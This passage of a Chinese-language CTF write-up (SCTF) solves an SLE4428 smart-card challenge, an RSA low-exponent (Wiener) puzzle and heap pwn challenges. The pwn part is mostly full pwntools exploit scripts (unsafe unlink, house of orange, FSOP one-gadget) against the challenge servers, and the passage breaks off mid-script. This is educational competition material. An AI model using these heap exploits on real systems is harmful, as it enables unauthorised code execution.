src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c3b7792-75fc-1.png"></p></blockquote><h4><span id="0x01-4428协议介绍">0x01 4428协议介绍</span></h4><blockquote><p><strong>SLE4428信协议：</strong></p><p>数据传输协议是指连接IFD器件和IC之间接口的协议。在I/O的所有数据的变化是由CLK的下降沿上确定的。</p><p>数据传递协议由四个模式组成：</p><ul><li><p>复位并应答复位</p></li><li><p>命令模式</p></li><li><p>数据输出模式</p></li><li><p>处理模式</p></li></ul></blockquote><h5><span id="11-复位并应答复位">1.1 复位并应答复位</span></h5><p>​ 当给IC卡上电后，IC卡进人上电复位(POR)状态，上电复位状态由复位操作停止，复位由RST引脚从0变为1开始，CLK由0变为1结束，复位操作将使IC卡放弃当前执行的命令. 当IC卡复位后，必须进行一次读操作. 如下图复位操作的时序图:</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c4ebf1e-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c6128c0-75fc-1.png"></p><p>复位应答使Ic卡内部的地址计数器归零, 并且第一个数据位出现在I／O上. 然后再输人31个脉冲, 读出31位数据.</p><blockquote><p>这段数据一般在最开始, 对密码分析暂无价值.</p></blockquote><h5><span id="12-命令模式">1.2 命令模式</span></h5><p>​ SLE4428 IC卡的命令模式(命令输入)是当RST置高电平时, 相反, 当RST置低电平时为数据输出. 相较于复位模式, RST置高电平时间要长很多, 一般为三个字节的时间. 如下图:</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c6f687c-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c815654-75fc-1.png"></p><table><thead><tr class="header"><th>RST</th><th>I/O</th></tr></thead><tbody><tr class="odd"><td>1</td><td>Command entry(命令输入)</td></tr><tr class="even"><td>0</td><td>Data output(数据输出)</td></tr></tbody></table><p>​ SLE4428总共有8种命令模式, 如下图:</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c8c7c3c-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c97b8fe-75fc-1.png"></p><blockquote><p>如上面两图, 解释如下:</p><ul><li>Byte 1的低6位(S0 - S5)是执行的操作, 高二位(A8 - A9)是地址位(目的地址)的高二位.</li><li>Byte 2的8位(A0 - A7)是目的地址的低8位, 所以目的地址位总共有: (A0 - A9) 10位.</li><li>Byte 3的8位(D0 - D7)是数据位. 当要向IC卡写数据的时候(100011 / 110011 / 000011 / 010011), 这个字节就是要写入的数据. 当IC卡读数据的时候(001100 / 011100 / 101100), 这个地址无效.</li><li><strong>注意</strong>: 读时序图的时候, 要注意是小端模式.</li></ul></blockquote><h3><span id="开始解题">开始解题</span></h3><h4><span id="密码校验">密码校验</span></h4><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7cadbf3c-75fc-1.png"></p><p>​ 题目种提到了改了用户密码, 并修改了金额, 如果是要写数据, 就必须先校验密码, 否则只能读取卡中的部分内容, 更加无法修改数据. SLE4428校验过程如下:</p><ol type="1"><li><p>写错误计数器中没有被写过的一位:</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7cbcb5be-75fc-1.png"></p></li><li><p>分别输入(10110011)第一个/第二个校验码, <strong>可得密码是(0512)</strong> :</p></li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7ccb7ec8-75fc-1.png"></p><ol start="3" type="1"><li><p>校验通过后,擦除错误计数器EC(在该数据中没找到, 倒是有个不带保护位的读操作011100, 估计是先读EC, 若错误计数器为0就不擦除, 否则就要擦除.)</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7cdf79fa-75fc-1.png"></p></li></ol><h4><span id="写擦除数据">写/擦除数据</span></h4><p>​ 密码校验通过之后, 便可以进行写/擦除数据的操作. 向IC卡写数据时(写0), 是对IC卡存储区的一个字节的某些位进行写. 向IC卡擦除数据时(写1), 是对IC卡存储区的整个字节进行擦除操作. 下面两图是写/擦除数据操作, 题目修改数据部分, 就是在这里. 这里总共有16次写/擦除操作, 每次操作取相应的目的地址(Byte 2)和数据(Byte 3), 即得到全部flag.</p><blockquote><p>Address: 80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F</p><p>Data: FF F6 05 72 FF FF FF FF FF FF FF FF FF FF FF FF</p></blockquote><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7ced22e4-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7cfba530-75fc-1.png"></p><p>至此可得flag:</p><blockquote><p><code>flag:sctf{0512+808182838485868788898A8B8C8D8E8F+FFF60572FFFFFFFFFFFFFFFFFFFFFFFF}</code></p></blockquote><h1><span id="0x01-crypto">0x01 Crypto</span></h1><h2><span id="it-may-contain-flag">it may contain 'flag'</span></h2><p>e非常大，导致d会很小，使用低解密指数攻击。借助工具(https://github.com/pablocelayes/rsa-wiener-attack/blob/master/RSAwienerHacker.py)求得d=731297.则msg=38321129004205530330779911668681589489034853148078444，INT转ASCII得到flag1sH3r3_d_ist0sma1l</p><blockquote><p>flag：SCTF{flag1sH3r3_d_ist0sma1l}</p></blockquote><h1><span id="0x02-pwn">0x02 Pwn</span></h1><h2><span id="bufoverflow_a">bufoverflow_a</span></h2><p>首先leak出libc基址，然后构造large bin 来leak出堆地址，尝试过unsafe unlink…... 然而它delete完会置0………..感觉还是要house of orange…….. 下面是payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p=process(<span class="string">'./bufoverflow_a'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'116.62.152.176'</span>,<span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(sz)</span>:</span></span><br><span class="line">se(<span class="string">'1\n'</span>)</span><br><span class="line">ru(<span class="string">'Size: '</span>)</span><br><span class="line">se(str(sz)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">se(<span class="string">'2\n'</span>)</span><br><span class="line">ru(<span class="string">'Index: '</span>)</span><br><span class="line">se(str(idx)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(content)</span>:</span></span><br><span class="line">se(<span class="string">'3\n'</span>)</span><br><span class="line">ru(<span class="string">'Content: '</span>)</span><br><span class="line">se(content)</span><br><span class="line">ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">se(<span class="string">'4\n'</span>)</span><br><span class="line">data=ru(<span class="string">'1. Alloc'</span>)</span><br><span class="line">ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------leak libc base ---------------</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">libc=u64(show()[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">base=libc<span class="number">-0x399B58</span></span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment">#clear</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak heap base------------------------</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line">alloc(<span class="number">0x1000</span>)</span><br><span class="line">alloc(<span class="number">0x500</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x98</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">heap=u64(show()[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0xb0</span></span><br><span class="line">haddr=heap+<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#clear</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------unsafe unlink-------</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line">alloc(<span class="number">0xf8</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">fill(p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(haddr<span class="number">-0x18</span>)+p64(haddr<span class="number">-0x10</span>)+<span class="string">'a'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x1f8</span>)</span><br><span class="line">fill(p64(<span class="number">0x41</span>)*<span class="number">0x3e</span>+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x218</span>)</span><br><span class="line">fill(<span class="string">'a'</span>*<span class="number">0x118</span>+p64(<span class="number">0x91</span>)+(p64(<span class="number">0x21</span>)*<span class="number">24</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_list_all_addr = base + e.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">jump_table_addr = base + e.symbols[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x218</span>)</span><br><span class="line">file_struct=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(libc)+p64(io_list_all_addr - <span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">file_struct += p64(jump_table_addr)</span><br><span class="line">file_struct += p64(base + <span class="number">0x3f52a</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fill(<span class="string">'a'</span>*<span class="number">0x110</span>+file_struct+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base+<span class="number">0x3f52a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><code>flag:SCTF{0Ne_Nu11_8y7e_c4n_p1ck_up_7he_e@r7h}</code></p></blockquote><h2><span id="sbbs">sbbs</span></h2><p>login处有溢出，可以在任意地方赋值admin .clientele 利用这个可以扩大某个被free的unsorted bin，然后控制后面的chunk</p><p>到这里的话如果给了libc，可以按照上一题的做法，house of orange</p><p>这里靠报错信息来找libc</p><p>找到是2.23的</p><p>然后之后就常规house of orange了</p><p>下面是payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"><span class="comment">#p=process('./sbbs')</span></span><br><span class="line">p=process(<span class="string">'./sbbs'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'116.62.142.216'</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">se(<span class="string">'1\n'</span>)</span><br><span class="line">ru(<span class="string">'Pls Input your note size'</span>)</span><br><span class="line">se(str(sz)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'Input your note'</span>)</span><br><span class="line">se(content)</span><br><span class="line">ru(<span class="string">'your note is\n'</span>)</span><br><span class="line">data=ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">ru(<span class="string">'4.exit'</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">se(<span class="string">'2\n'</span>)</span><br><span class="line">ru(<span class="string">'Input id:'</span>)</span><br><span class="line">se(str(idx)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'4.exit'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(name,ty)</span>:</span></span><br><span class="line">se(<span class="string">'3\n'</span>)</span><br><span class="line">ru(<span class="string">'Please input your name'</span>)</span><br><span class="line">se(name)</span><br><span class="line">ru(<span class="string">'choice type'</span>)</span><br><span class="line">se(str(ty)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'4.exit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----leak heap--------</span></span><br><span class="line">create(<span class="number">0x1488</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">data=create(<span class="number">0x108</span>,<span class="string">'a'</span>*<span class="number">17</span>+<span class="string">'\n'</span>)[<span class="number">16</span>:]</span><br><span class="line">heap=u64(data.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))<span class="number">-0x61</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#clear</span></span><br><span class="line">create(<span class="number">0x1378</span>,<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------use login------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0xe8</span>,(p64(<span class="number">0x60</span>)+p64(<span class="number">0x21</span>))*<span class="number">0xe</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">login(<span class="string">'a'</span>*<span class="number">8</span>+p64(heap+<span class="number">0x118</span><span class="number">-0xf</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=u64(create(<span class="number">0x2e8</span>,<span class="string">'\n'</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">base=libc<span class="number">-0x3C4B78</span></span><br><span class="line"></span><br><span class="line">io_list_all_addr = base + e.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">jump_table_addr = base + e.symbols[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x2e8</span>,<span class="string">'a'</span>*<span class="number">0xe8</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0x21</span>)*<span class="number">30</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">create(<span class="number">0x1408</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">file_struct=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(libc)+p64(io_list_all_addr - <span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">file_struct += p64(jump_table_addr)</span><br><span class="line">file_struct += p64(base + <span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x2e8</span>,<span class="string">'a'</span>*<span class="number">0xe0</span>+file_struct+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(<span class="string">'1\n250\n'</span>)</span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><code>flag:sctf{c4FRjmtQKQaRidxdOCjzB898A4fHb0rM}</code></p></blockquote><h2><span id="bufoverflow_b">bufoverflow_b</span></h2><p>新加了一个函数，可以控制地址写一个byte, 应该是可以通过这个这个改写当前堆指针 的末尾为0，然后就可以把它自己改成free_hook, 再来就可以修改 free_hook 了</p><p>貌似是这样，并没有进行尝试，自己用的应该算是非预期解吧。。</p><p>其他的部分和 bufferoverflow_a 都差不多，fill 的时候改了一点 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_str_E2D</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">"Read faild!\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> || !buf )  <span class="comment">//===========&gt; 这里 buf 读取直到遇到 null buye</span></span><br><span class="line">………………………………...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>前面 a 部署 fake chunk size 什么的 时候必定会存在 null byte</p><p>这样前面的 fill 的过程就会失效</p><p>但是还是可以通过 fill 来部署。。</p><p>具体这样</p><p>比如要搞一个 fake size 0x61</p><p>0x00 | 0x61 fd | bk</p><p>首先 fill 一下， size 的地方 传入  aaaaaaaa|  fd | bk 然后重新 fill 一下， fill 的长度变短，像下面 aaaaaaa|</p><p>这样  就会遗留在 heap 上</p><p>其他的地址也可以类似的操作，不断的fill 之后就可以构造和 bufoverflow_a 一样的布局</p><p>那就简单了，改改 bufoverflow_a 的脚本就完事了, 脚本当时草草写的，并没有太考虑效率。。这样做缺点是需要有很多fill, 会花比较长时间。。w</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 